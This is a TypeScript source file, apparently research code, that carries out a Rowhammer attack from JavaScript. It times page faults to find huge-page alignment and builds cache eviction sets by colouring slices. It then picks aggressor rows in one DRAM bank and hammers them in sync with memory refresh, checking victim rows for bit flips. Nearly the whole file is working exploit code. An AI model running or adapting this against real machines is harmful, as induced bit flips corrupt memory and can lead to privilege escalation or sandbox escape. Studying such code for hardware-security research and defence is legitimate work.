/// <reference path="./models/BankStats.ts" />
/// <reference path="./models/EvictionSet.ts" />
/// <reference path="./models/LLCInfo.ts" />
/// <reference path="./utils/PRNG.ts" />
/// <reference path="./utils/Helpers.ts" />
/// <reference path="./utils/Loggers.ts" />

/* --- Constants --- */
const gb: number = 2 ** 30;
const mb: number = 2 ** 20;
const kb: number = 2 ** 10;

const VERBOSE: boolean = true;
const MAX_UNIQUE_LANES: number = 3; /* A, B, C, for non-uniformity */
const MIN_REPS_PER_REF: number = 4;
const DATA_PATTERN: number = 0xaaaaaaaa;

const NUM_LINE_BITS: number = 6; /* Cache line size in bits */
const NUM_BUS_BITS: number = 3; /* Bus/chip offset */

const HUGEPAGES: number = 500;
const HUGE_PAGE_MASK: number = 2 * mb - 1;
const PAGES: number = HUGEPAGES * 512;

/* --- Initialization --- */
let timeZero = performance.now();
const firstTimeZero = timeZero;

/* We sometimes assign to dummy to avoid assignment being optimized away */
var dummy = new Uint8Array(new ArrayBuffer(4 * kb));

/* buf8 and buf64 will be our playgrounds */
var buf8: Uint8Array = new Uint8Array(new ArrayBuffer(1 * gb));

/* View of buf8! */
const buf32Bounds: number = 0xfffffff;
var buf32: Uint32Array = new Uint32Array(buf8.buffer);

/* --- Functions --- */

/**
 * Page offset to buffer offset (formerly otoi)
 *
 * @param {number} o/pa - Huge page offset
 * @param {number} h - Huge page index
 * @returns {number} - Offset in buffer
 */
function ptob(p: number, h: number, hugePageAtPages: number[]): number {
  return hugePageAtPages[h] * 4 * kb + p;
}

/**
 * Buffer offset to page offset (formerly itoo)
 *
 * @param {number} i - Offset in buffer
 * @returns {number} - Huge page offset
 */
function btop(b: number, hugePageAtPages: number[]): number {
  let x: number = b - hugePageAtPages[0] * 4 * kb;
  let p = x & HUGE_PAGE_MASK;
  let h = (x - p) / (2 * mb);
  assert((x - p) % (2 * mb) === 0);
  return { h: h, p: p };
}

/**
 * Returns a subset of addresses that fall into the same slice
 *
 * @param{number} h - The index of the huge page in hugePageAtPages
 * @param{number} slice - The targeted slice index
 * @returns {Array<number>} - Addresses of the desired slice
 */
function getSameSlice(
  h: number,
  hugePageAtPages: number[],
  slice: number,
  li: LLCInfo,
): number[] {
  let subSet = [];

  /* Don't change the set, check for same slice */
  for (let p = 0; p < 2 * mb; p += 2 ** (li.numSetBits + NUM_LINE_BITS)) {
    if (li.ptosl(p) === slice) {
      subSet.push(ptob(p, h, hugePageAtPages));
    }
  }

  assert(subSet.length === li.numSameSliceOffsetsPerHugePage);

  return subSet;
}

function buildEvictionSet(
  es: EvictionSet,
  hugePageAtPages: number[],
  li: LLCInfo,
) {
  /*
   * Permutation and huge page to slice. Just takes the right three bits of the
   * permutation number @p. Wouldn't work if the number of slices would not be
   * a power of two!
   */
  function perhtosl(per: number, h: number) {
    return (per >> (3 * h)) & 0x7; /* 0x7 = 0111 */
  }

  es.addrs = es.addrs.fill(
    0,
    0,
    li.numHugePagesPerEvictionSet * li.numSameSliceOffsetsPerHugePage,
  );

  /*
   * Test each possible permutation, e.g., 8^5 = 32'768 combinations.
   *
   * A permutation is a set of 5 huge pages. Of all these permutations, in one
   * case they all have the same color. That's the case we're looking for
   */
  for (
    let per: number = 0;
    per < li.numSlices ** li.numHugePagesPerEvictionSet;
    per++
  ) {
    /* Permute the huge page offset of each THP and update the eviction set. */
    for (let h: number = 0; h < li.numHugePagesPerEvictionSet; h++) {
      /*
       * This effectively "colours" each huge page. Chooses a perceived slice
       * for each of them
       */
      let s: number = perhtosl(per, h);

      es.addrs.splice(
        h * li.numSameSliceOffsetsPerHugePage /* Index to replace at */,
        li.numSameSliceOffsetsPerHugePage /* Num. elements to replace */,
        ...getSameSlice(
          h,
          hugePageAtPages,
          s,
          li,
        ) /* New elements (unpacked) */,
      );
    }

    let y = es.evicts();

    if (VERBOSE) {
      console.log(
        `hp: ${__pfst(per, 0, 5)}/${__pfst(
          li.numSlices ** li.numHugePagesPerEvictionSet,
          0,
          5,
        )}: median/base/?: ${__pfst(y.median, 1, 1)}/${__pfst(
          es.baseline,
          1,
          1,
        )}/${y.evicts}`,
      );
    }

    if (y.evicts) {
      if (VERBOSE) {
        for (let h = 0; h < li.numHugePagesPerEvictionSet; h++) {
          console.log(
            "permutation=" + per.toString(2),
            "hugepage=" + h,
            "sliceIdx=" + perhtosl(per, h),
          );
        }
      }

      return;
    }
  }

  throw new Error("Could not find an eviction set!");
}

const randElement = (xs) => xs[getRandomInt(0, xs.length)];

/*
 * for (const ratio of [2, 3, 5]) {
 *   for (const expansion of [1, 2, 4]) {
 *     for (const ax of [0x1, 0x101, 0x841]) {
 *       for (const ay of [0x841, 0x1111, 0x2491]) {
 *         for (const tREFIs of [9, 17, 33]) {
 */
function makeDoubleSpaceIterator(
  ratio: number[],
  expansion: number[],
  assemblyX: number[],
  assemblyY: number[],
  nonUniformities: number[][],
  tREFIs: number[],
) {
  let index: number = 0;
  const max: number = 8;

  const doubleSpaceIterator = {
    next() {
      index++;

      if (index <= max) {
        return {
          value: {
            ratio: randElement(ratio),
            expansion: randElement(expansion),
            assemblyX: randElement(assemblyX),
            assemblyY: randElement(assemblyY),
            nonUniformities: randElement(nonUniformities),
            tREFIs: randElement(tREFIs),
          },
          done: false,
        };
      } else {
        return { value: null, done: true };
      }
    },
  };

  return doubleSpaceIterator;
}

/*
 * for (const tREFIs of [13, 11, 9, 7, 5, 3, 2]) {
 *   for (const assembly of [0x2929, 0x2491, 0x1111, 0x841]) {
 *     for (const nonUniformity of [3, 2, 1]) {
 */
function makeHSpaceIterator(
  tREFIs: number[],
  assembly: number[],
  nonUniformity: number[],
) {
  let index: number = 0;
  /* Shouldn't matter!? Hmmm. */
  const max: number = 4;

  const hspaceIterator = {
    next() {
      index++;

      if (index <= max) {
        return {
          value: {
            tREFIs: randElement(tREFIs),
            assembly: randElement(assembly),
            nonUniformity: randElement(nonUniformity),
          },
          done: false,
        };
      } else {
        return { value: null, done: true };
      }
    },
  };

  return hspaceIterator;
}

function makeSliceIterator(li: LLCInfo) {
  let index: number = 0;
  const max: number = li.numSlices;

  const sliceIterator = {
    next(matches: number[]) {
      index++;

      return { value: matches.map((x) => (x + 1) % li.numSlices), done: false };
    },
  };

  return sliceIterator;
}

function sliceMatcher(
  es: EvictionSet,
  hugePageAtPages: number[],
  li: LLCInfo,
): Array<number> {
  console.log("[>] Learning slice color of " + HUGEPAGES + " huge pages... ");
  let testSet = new EvictionSet(li.wayness);

  testSet.addrs = [...es.addrs];

  /*
   * Contains, for each huge page, the "slice correction" (say, virtual slice)
   * that when applied, gives it the same physical slice (colour) as all other
   * pages
   */
  let matches = new Array(hugePageAtPages.length);

  /*
   * The eviction set we already found clearly has 5 pages of the same color.
   *
   * We only try permutations of the first five huge pages!
   */
  for (let h: number = 0; h < li.numHugePagesPerEvictionSet; h++) {
    matches[h] = li.ptosl(
      btop(es.addrs[h * li.numSameSliceOffsetsPerHugePage], hugePageAtPages).p,
    );
  }

  for (
    let h: number = li.numHugePagesPerEvictionSet;
    h < hugePageAtPages.length;
    h++
  ) {
    let foundColour = false;

    while (!foundColour) {
      for (let s: number = 0; s < li.numSlices; s++) {
        /*
         * Replace the first numOffsetsPerPage of the eviction set and try to
         * restore eviction
         */
        testSet.addrs.splice(
          0,
          li.numSameSliceOffsetsPerHugePage,
          ...getSameSlice(h, hugePageAtPages, s, li),
        );

        let y = testSet.evicts();

        console.log(
          `h ${h}, s ${s}: ${__pfst(y.median, 2, 2)} < ${__pfst(testSet.baseline, 2, 2)}`,
        );

        if (y.evicts) {
          foundColour = true;
          matches[h] = s;
          break;
        }
      }
    }
  }

  return matches;
}

function getSetPairs(
  pairs: number,
  bank: number,
  matches: number[],
  hugePageAtPages: number[],
  bs: bankStats,
  li: llcInfo,
): EvictionSet[] {
  let result: EvictionSet[] = [];
  const size: number = li.wayness * MAX_UNIQUE_LANES;

  for (let i = 0; i < pairs; i++) {
    let count = 0;

    let esx = new EvictionSet(li.wayness);
    let esy = new EvictionSet(li.wayness);

    for (let h = 0; h < hugePageAtPages.length; h++) {
      let addrsFromPage = getSameSlice(h, hugePageAtPages, matches[h], li);
      assert(addrsFromPage.length === li.numSameSliceOffsetsPerHugePage);
      addrsFromPage = addrsFromPage.filter(
        (b) => bs.ptoba(btop(b, hugePageAtPages).p) === bank,
      );
      esx.addrs = esx.addrs.concat(addrsFromPage);
      count += addrsFromPage.length;
    }

    assert(count >= size * pairs);

    shuffle(esx.addrs);

    /* Randomize the set by changing the column bits that are not bank bits */
    let freeMask =
      bs.columnMask & ~bs.bankFunctions.reduce((l, r) => l | r) & li.setMask;
    let randomMask = getRandomInt(1, 1 << nzb(freeMask)) << tzb(freeMask);

    esx.addrs = esx.addrs.map((b) => b ^ randomMask);

    /* This is where slice and how we create multiple set pairs */
    esx.addrs = esx.addrs.slice(i * size, i * size + size);

    if (!esx.evicts().evicts) return [];

    for (const addr of esx.addrs) {
      let x = btop(addr, hugePageAtPages);
      let b = ptob(bs.mutateRowPreserveBank(x.p), x.h, hugePageAtPages);
      esy.addrs.push(b);
    }

    if (!esy.evicts().evicts) return [];

    /* We only push @esx, which is now paired to @esy */
    esx.pair(esy);
    result.push(esx);
  }

  return result;
}

/**
 * Computes the 4K pages that correspond to the huge pages by taking the
 * previously determined offset into account.
 *
 * For example, "256, 768" means that the first huge page
 * starts at page 256 (i.e., 1 MiB) and the second huge page at page 768 (i.e.,
 * 3 MiB).
 *
 * @param {number} offset - The offset where the huge pages start in the buf8 buffer.
 * @returns {Array} - The pages corresponding to the numHugePages huge pages.
 */
function computeHugePagesAtPages(offset: number): number[] {
  let offsetToPage = Math.round((offset * mb) / (4 * kb));

  let hugePageAtPages = Array.from({ length: HUGEPAGES }, (_, i) => {
    return offsetToPage + i * 512;
  });

  assert(
    hugePageAtPages.length == HUGEPAGES,
    "hugePageAtPages should have length equal to numHugePages",
  );

  return hugePageAtPages;
}

/**
 * Initializes buf8 with ascending values (0,1,..) to each page.
 */
function populate(length: number) {
  for (let i = 0; i < length; i += 4 * kb) {
    buf8[i] = 0;
  }
}

/**
 * Populates the `buf8` array such that accesses either fall on two 4K pages
 * (i.e., cause two page faults: slow) or on the same huge page (i.e., one
 * page fault: fast). This is used to detect whether the first huge page in our
 * buffer starts at either offset 0 or 1 MB
 *
 * @returns {number} The time taken to populate the array.
 */
function amplifiedPopulate(): number {
  let before = performance.now();

  for (let i = 0; i < 250; i++) {
    let j = 1.5 * mb + i * 4 * mb;
    buf8[j] = j;
    buf8[j + mb] = j + mb;
  }

  let after = performance.now();
  return after - before;
}

/**
 * Measures the access time for accessing pages at random offsets.
 *
 * @param {number} start_offset_kb - The starting offset in kilobytes.
 * @param {number} num_tests - The number of pages to access.
 * @returns {number} - The time taken to access the pages in milliseconds.
 */
function measureAccessTime(start_offset_kb: number, num_tests: number): number {
  // Generate page addresses with random within-page offsets.
  let indices = [];
  for (let i = 1; i < num_tests; i++) {
    indices.push(i * 4 * kb + getRandomInt(0, 3));
  }
  shuffle(indices);

  // Access page while measuring access time.
  let before = performance.now();
  for (let i = 0; i < num_tests; i++) {
    let j = start_offset_kb + 2 * kb + indices[i];
    buf8[j] = i;
  }
  return performance.now() - before;
}

/**
 * Determines the page alignment, i.e., the number of megabytes before the first
 * huge page in the buf8 buffer.
 *
 * @returns {number} The page alignment value: 0 (MiB) or 1 (MiB).
 */
function detectPageAlignment(): number {
  let offset;

  if (UARCH == UARCHS.KABY) {
    /* Typically either ~42/~86 */
    let time = amplifiedPopulate();
    offset = time > 70 ? 0 : 1;
    console.log(`[>] Detecting page alignment... ${__pfst(time, 0, 2)} < 70?`);
  } else if (UARCH == UARCHS.COFFEE) {
    /* We check 256 pages as 256 x 4KiB = 1MiB and we found that 1 MiB is the
     * boundary where we typically see the first huge page.
     * It is unclear why but turning these two rows around reduces the difference
     * between t1 and t2 (but still t2 is faster than t1) - prefetching maybe? */
    let t1 = measureAccessTime(0, 256);
    let t2 = measureAccessTime(1 * mb, 256);
    offset = t1 > t2 * 1.5 ? 1 : 0;
  } else {
    throw new Error("Unknown architecture");
  }

  console.log(`[>] First huge page is at buffer offset ${offset} MiB`);
  return offset;
}

/***
 *
 */
function determineNumXORs(
  evictionSet: EvictionSet,
  assembly: Assembly,
  singleBankAggressors: number[],
): number {
  const ratioEpsilon = 0.02;
  const ratioTarget = 2.5;
  const minXORstep = 20;

  let initialNumberOfXORs = 1000;
  let XORstep = 100;

  console.log("[>] Soft sync... (XORs, tREFI/t)");

  while (true) {
    let selectionPairsIdxs = aggressorSelection(
      0,
      evictionSet.addrs.length,
      assembly.numHitPairs + assembly.numPairs,
    );
    let selectionIdxs = interleave(
      selectionPairsIdxs[0],
      selectionPairsIdxs[1],
    );
    printAddresses(
      selectionIdxs.map((i) => evictionSet.addrs[i]),
      "aggressorSelection",
      DBG_PRINT_EVICTION_SETS,
    );

    let pattern = buildAny(selectionIdxs, evictionSet.addrs, assembly);
    install(pattern);

    let ratio = hammerBench(0, singleBankAggressors, initialNumberOfXORs);
    console.log(`(${initialNumberOfXORs}, ${ratio})`);

    let diff = Math.abs(Math.round(ratio) - ratio);
    if (diff <= ratioEpsilon || Math.abs(diff - 0.5) <= ratioEpsilon) {
      break;
    }

    /* Check if we are too fast (increase XORs) or too slow (decrease XORs). */
    XORstep = Math.max(Math.round(XORstep * 0.8), minXORstep);
    initialNumberOfXORs += ratio > ratioTarget ? XORstep : -XORstep;

    if (initialNumberOfXORs < 0) {
      initialNumberOfXORs = 0;
      break;
    }
  }
  return initialNumberOfXORs;
}

function sync(
  hammer: (xors: number, refIters: number[], amp: number) => number,
  chaseLengths: number[],
  repsPerREFs: number[],
  tREFIs: number,
) {
  let xors: number = 0;
  let squeeze: boolean = true;

  const factor: number = 1;
  const ns: number = tREFIs * (78 * factor);

  while (true) {
    /* 7800 ns -> 7.8 us -> *1000 -> 7.8 ms -> *10 -> 78 ms */
    /* 7800 ns -> 7.8 us -> *1000 -> 7.8 ms -> *100 -> 780 ms */
    const amp = factor * 10 ** 4; /* DON'T CHANGE */
    let before = performance.now();

    /* The actual set to hammer is passed through a closure */
    dummy[0] ^= hammer(
      xors,
      repsPerREFs.map((r, i) => r * chaseLengths[i]),
      amp,
    );

    let after = performance.now();
    let t = after - before;

    if (t < ns && squeeze) {
      repsPerREFs = repsPerREFs.map((x) => x + 2);
      print(
        "increasing...",
        __pfst(t / ns, 3, 4),
        ...repsPerREFs.map((x) => __pfst(x, 0, 2)),
      );
      continue;
    } else if (t > 2 * ns) {
      return null;
    } else if (t > 1.02 * ns) {
      squeeze = false;

      if (repsPerREFs.some((x) => x > MIN_REPS_PER_REF)) {
        repsPerREFs = repsPerREFs.map((x) =>
          x > MIN_REPS_PER_REF ? x - 1 : x,
        );
        print(
          "decreasing...",
          __pfst(t / ns, 3, 4),
          ...repsPerREFs.map((x) => __pfst(x, 0, 2)),
        );
        continue;
      } else {
        return null;
      }
    }

    let scale: number = 4 * ns;
    let add: number = scale * ((ns - (after - before)) / ns);

    if (Math.abs(add) <= 0.02 * scale) break;

    print(
      ...repsPerREFs.map((x) => __pfst(x, 0, 2)),
      __pfst(xors, 0, 5),
      "+" + __pfst(add, 0, 4),
      __pfst(t, 0, 5),
      __pfst(ns, 0, 5),
    );

    xors += add;
  }

  return { xors: xors, repsPerREFs: repsPerREFs };
}

/*
 * For debugging:
 * sets[0].printIterable(hugePageAtPages, li, bs);
 */
const setVictim = (b, column) => {
  assert(b % 4 === 0);
  b >>= 2;
  buf32[b] = DATA_PATTERN;
  assert(typeof buf32[b] === "number");
};

/*
 * For debugging:
 *
 * const printVictim = (b, column) => {
 *   assert(b % 4 === 0);
 *
 *   if (column === 0) {
 *     let x: number = btop(b, hugePageAtPages);
 *     print(
 *       "V",
 *       __pfst(bs.ptoba(x.p), 0, 2),
 *       __pfst(bs.ptoro(x.p), 0, 5),
 *       __pfst(x.h, 0, 3),
 *     );
 *   }
 * };
 */

const setAggressor = (b, column) => {
  assert(b % 4 === 0);
  b >>= 2;
  buf32[b] = DATA_PATTERN ^ 0xffffffff;
  assert(typeof buf32[b] === "number");
};

const checkVictim = (b, column) => {
  assert(b % 4 === 0);
  b >>= 2;

  if (buf32[b] !== DATA_PATTERN) {
    print(
      "csv:flp," +
        timeInSeconds(performance.now(), firstTimeZero)
          .toFixed(0)
          .toString()
          .padStart(6, " ") +
        "," +
        DATA_PATTERN.toString(16) +
        "," +
        buf32[b].toString(16),
    );
  }

  assert(typeof buf32[b] === "number");
};

function setsToDouble(
  pairs: EvictionSet[],
  ratio: number,
  expansion: number,
  assemblies: number[],
  nonUniformities: number[],
  tREFIs: number,
  hugePageAtPages: number[],
  bs: BankStats,
  li: LLCInfo,
) {
  /* Exactly: two pairs */
  assert(pairs.length === 2);
  assert(ratio > 1);

  const repsPerREFs: number[] = [
    MIN_REPS_PER_REF,
    MIN_REPS_PER_REF * ratio,
  ].map((x) => x * expansion);

  pairs.forEach((pair, i) =>
    pair.sets.forEach((set) => {
      set.newIterable(assemblies[i], 16, nonUniformities[i]);
      set.install(DATA_PATTERN);
    }),
  );

  const chaseLengths: number[] = pairs.map((pair) =>
    pair.sets.reduce((l, r) =>
      l.iter.length === r.iter.length ? r.iter.length : false,
    ),
  );

  /*
   * Done in sync!
   * const refIters = repsPerREFs.map((r, i) => r * chaseLengths[i]);
   */

  const hammer = (xors: number, refIters: number[], amp: number): number => {
    /* Cool stuff: will include the pairs reference! Closure */
    let x: number;
    let y: number;
    let z: number;

    for (let i = 0; i < amp; i++) {
      for (z = 0; z < xors; z++) {
        z += z ^ z;
      }

      for (let p = 0; p < pairs.length; p++) {
        x = pairs[p].start;
        y = pairs[p].partner.start;

        /* Double */
        for (let j = 0; j < refIters[p]; j++) {
          x = buf32[x & buf32Bounds];
          y = buf32[y & buf32Bounds];
        }
      }
    }

    return x ^ y ^ z;
  };

  let s = sync(hammer, chaseLengths, repsPerREFs, tREFIs);

  if (s === null) {
    print("aborting...");
    pairs.forEach((pair) => pair.sets.forEach((set) => set.uninstall()));
    return;
  }

  print(
    "csv:pat,d," +
      timeInSeconds(performance.now(), firstTimeZero)
        .toFixed(0)
        .toString()
        .padStart(6, " ") +
      "," +
      assemblies
        .map((x) => x.toString(16).padStart(4, "0"))
        .reduce((l, r) => l + "/" + r) +
      "," +
      __pfst(tREFIs, 0, 2) +
      "," +
      s.repsPerREFs.map((x) => __pfst(x, 0, 3)).reduce((l, r) => l + "/" + r) +
      "," +
      __pfst(nonUniformities[0], 0, 1) +
      "," +
      __pfst(nonUniformities[1], 0, 1) +
      "," +
      __pfst(s.xors, 0, 5) +
      "," +
      __pfst(ratio, 0, 1) +
      "," +
      __pfst(expansion, 0, 1),
  );

  pairs.forEach((pair) =>
    bs.rowsDo(pair, setVictim, setAggressor, hugePageAtPages, li),
  );
  pairs.forEach((pair) => pair.sets.forEach((set) => set.install()));

  print("hammer...");
  dummy[0] ^= hammer(
    s.xors,
    s.repsPerREFs.map((r, i) => r * chaseLengths[i]),
    (256 * 8192) / tREFIs,
  );

  print("check...");
  pairs.forEach((pair) =>
    bs.rowsDo(pair, checkVictim, null, hugePageAtPages, li),
  );

  pairs.forEach((pair) => pair.sets.forEach((set) => set.uninstall()));
}

function setsToH(
  pair: EvictionSet,
  assembly: number,
  tREFIs: number,
  nonUniformity: number,
  hugePageAtPages: number[],
  bs: BankStats,
  li: LLCInfo,
) {
  assert(pair.partner);

  let repsPerREF = MIN_REPS_PER_REF;
  let quatro = getRandomInt(0, 3) === 0 ? true : false;

  /*
   * For debugging:
   * printAddresses(set.addrs, "", true, hugePageAtPages, bs, li);
   */
  pair.sets.forEach((set) => {
    set.newIterable(assembly, 16, nonUniformity);
    /* For debugging: set.newIterable(0x0, 16, nonUniformity) */

    if (quatro) {
      set.install2(DATA_PATTERN);
    } else {
      set.install(DATA_PATTERN);
    }
  });

  let chaseLength = pair.sets.reduce((l, r) =>
    l.iter.length === r.iter.length ? r.iter.length : false,
  );

  /*
   * For debugging, you could do:
   * bs.rowsDo(sets[0], printVictim, printAggressor, hugePageAtPages, li);
   */
  const hammer = quatro
    ? (xors: number, refIters: number[], amp: number): number => {
        let xa: number = pair.iter32[0];
        let xb: number = pair.iter32[1];
        let xc: number = 0;

        let ya: number = pair.partner.iter32[0];
        let yb: number = pair.partner.iter32[1];
        let yc: number = 0;

        let z: number = 0;

        for (let i = 0; i < amp; i++) {
          for (z = 0; z < xors; z++) {
            z += z ^ z;
          }

          /* H */
          for (let j = 0; j < refIters[0]; j += 2) {
            xa = buf32[xa & buf32Bounds];
            ya = buf32[ya & buf32Bounds];
            xb = buf32[xb & buf32Bounds];
            yb = buf32[yb & buf32Bounds];

            xc = xa;
            xa = xb;
            xb = xc;

            yc = ya;
            ya = yb;
            yb = yc;
          }
        }

        return xa ^ xb ^ xc ^ ya ^ yb ^ yc ^ z;
      }
    : (xors: number, refIters: number[], amp: number): number => {
        let x: number = pair.start;
        let y: number = pair.partner.start;

        let z: number = 0;

        for (let i = 0; i < amp; i++) {
          for (z = 0; z < xors; z++) {
            z += z ^ z;
          }

          for (let j = 0; j < refIters[0]; j++) {
            x = buf32[x & buf32Bounds];
            y = buf32[y & buf32Bounds];
          }
        }

        return x ^ y ^ z;
      };

  assert(chaseLength % 2 === 0);

  let s = sync(hammer, [chaseLength], [repsPerREF], tREFIs);

  if (s === null) {
    print("aborting...");
    pair.sets.forEach((set) => set.uninstall());
    return;
  }

  print(
    "csv:pat,h," +
      timeInSeconds(performance.now(), firstTimeZero)
        .toFixed(0)
        .toString()
        .padStart(6, " ") +
      "," +
      assembly.toString(16).padStart(4, "0") +
      "," +
      __pfst(tREFIs, 0, 2) +
      "," +
      __pfst(s.repsPerREFs[0], 0, 2) +
      "," +
      __pfst(nonUniformity, 0, 1) +
      "," +
      __pfst(s.xors, 0, 5) +
      "," +
      quatro,
  );

  bs.rowsDo(pair, setVictim, setAggressor, hugePageAtPages, li);

  /* Reinstall! We wrote to the aggressor rows */
  pair.sets.forEach((set) => set.install());

  print("hammer...");
  dummy[0] ^= hammer(
    s.xors,
    [chaseLength * s.repsPerREFs[0]],
    (256 * 8192) / tREFIs,
  );

  print("check...");
  bs.rowsDo(pair, checkVictim, null, hugePageAtPages, li);

  pair.sets.forEach((set) => set.uninstall());
}

function mainDebugSmack(dimm: string) {
  const contents = os.file.readFile("../bank-functions/" + dimm + ".csv");
  const bankStats = new BankStats(contents);

  print(bankStats.bankFunctions);
  print(bankStats.rowMask);

  let llcInfo: LLCInfo;

  if (UARCH == UARCHS.KABY) {
    llcInfo = new LLCInfo(16, 8, 4, 10, sliceBitsKaby, getSliceKaby);
  } else if (UARCH == UARCHS.COFFEE) {
    /*
     * Coffee Lake i7-8700K has 12 slices instead of just 8 slices (Kaby Lake,
     * i7-7700K), see https:uops.info/cache.html. However, on CL we find  that
     * addresses only fall into six slices
     */
    llcInfo = new LLCInfo(16, 12, 4, 10, sliceBitsCoffee, getSliceCoffee);
  } else {
    assert(0);
  }

  let offset = detectPageAlignment();
  reportTime("alignment");

  /*
   * Populate the whole buf. Strictly speaking not necessary if the offset is 0
   * MiB, but for simplicity's sake we just always do it. The first 1 MiB we
   * will have to populate.
   */
  populate(buf8.length);

  /*
   * Mapping huge pages indices to normal page indices, takes into account the
   * offset at which the first huge page starts!
   */
  let hugePageAtPages: number[] = computeHugePagesAtPages(offset);

  let evictionSet = new EvictionSet(llcInfo.wayness);
  console.log("[>] Looking for first eviction set... ");
  buildEvictionSet(evictionSet, hugePageAtPages, llcInfo);
  reportTime("First eviction set found.");
  printAddresses(
    evictionSet.addrs,
    "Eviction Set",
    true,
    hugePageAtPages,
    bankStats,
    llcInfo,
  );

  console.log("[>] Finding pages with same slice color...");
  let matches = sliceMatcher(evictionSet, hugePageAtPages, llcInfo);
  reportTime(`Colors of ${HUGEPAGES} huge pages determined.`);

  let sliceIterator = makeSliceIterator(llcInfo);

  while (true) {
    /* For some reason, this only works for half of the slices!? */
    let si = sliceIterator.next(matches);

    if (si.done) break;

    matches = si.value;

    /* Get a preview of the available banks */
    let banks: number[] = [];

    for (let h = 0; h < 2 ** bankStats.bankFunctions.length; h++) {
      let addrsFromPage = getSameSlice(h, hugePageAtPages, matches[h], llcInfo);
      addrsFromPage = addrsFromPage.map((b) =>
        bankStats.ptoba(btop(b, hugePageAtPages).p),
      );
      banks = banks.concat(addrsFromPage);
    }

    let bank = banks[Math.floor(Math.random() * banks.length)];

    print("bank ", bank);

    const pairs: EvictionSet[] = getSetPairs(
      2,
      bank,
      matches,
      hugePageAtPages,
      bankStats,
      llcInfo,
    );

    if (pairs.length !== 2) continue;

    let doubleSpaceIterator = makeDoubleSpaceIterator(
      [2, 3, 5],
      [1, 2, 4],
      [0x1, 0x101, 0x841],
      [0x841, 0x1111, 0x2491],
      [
        [1, 1],
        [1, 2],
        [2, 1],
        [2, 2],
        [2, 3],
        [0, 0],
        [0, 3],
        [3, 0],
        [3, 3],
      ],
      [9, 17, 33],
    );

    while (true) {
      let pi = doubleSpaceIterator.next();
      if (pi.done) break;
      setsToDouble(
        pairs,
        pi.value.ratio,
        pi.value.expansion,
        [pi.value.assemblyX, pi.value.assemblyY],
        pi.value.nonUniformities,
        pi.value.tREFIs,
        hugePageAtPages,
        bankStats,
        llcInfo,
      );
    }

    let hspaceIterator = makeHSpaceIterator(
      [13, 11, 9, 7, 5, 3, 2, 1],
      [0x2929, 0x2491, 0x1111, 0x841, 0x101],
      // [0x2491] [> For a2, for testing <],
      [3, 2, 1],
    );

    while (true) {
      let pi = hspaceIterator.next();
      if (pi.done) break;
      setsToH(
        pairs[0],
        pi.value.assembly,
        pi.value.tREFIs,
        pi.value.nonUniformity,
        hugePageAtPages,
        bankStats,
        llcInfo,
      );
    }

    print("changing eviction sets");
  }

  assert(0);
}

/* The only argument for now: the DIMM you're targeting */
assert(scriptArgs.length == 1);

let dimm = scriptArgs[0];

mainDebugSmack(dimm);
